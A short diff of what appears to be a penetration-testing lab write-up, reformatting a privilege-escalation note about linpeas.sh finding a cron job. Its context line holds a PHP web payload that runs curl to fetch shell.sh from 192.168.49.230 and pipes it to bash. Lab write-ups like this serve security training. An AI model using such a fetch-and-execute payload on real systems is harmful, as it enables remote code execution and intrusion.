@@ -229,7 +229,7 @@ set test "<?php system('curl 192.168.49.230/shell.sh | bash'); ?>"
 # Privilege Escalation
 ## Local Enumeration
 
--Ran linpeas.sh and found a script running every 3 minutes via crontab per the findings below:
+#### -Ran linpeas.sh and found a script running every 3 minutes via crontab per the findings below:
 
 ![](Images/Pasted%20image%2020221101120654.png)
 
